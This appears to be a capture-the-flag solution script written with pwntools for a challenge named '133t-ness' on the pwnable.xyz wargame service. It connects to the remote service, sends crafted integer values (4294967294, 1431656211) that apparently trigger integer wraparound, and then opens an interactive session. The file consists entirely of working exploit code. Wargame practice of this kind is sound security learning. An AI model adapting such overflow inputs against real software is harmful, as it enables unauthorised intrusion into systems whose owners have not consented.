from pwn import *

#p = process("./133t-ness")
p = remote("svc.pwnable.xyz", 30008)

pause()
p.sendline("1335")
sleep(0.1)
p.sendline("4294967294")
sleep(0.1)
p.sendline("3 1431656211")
sleep(0.1)

p.interactive()
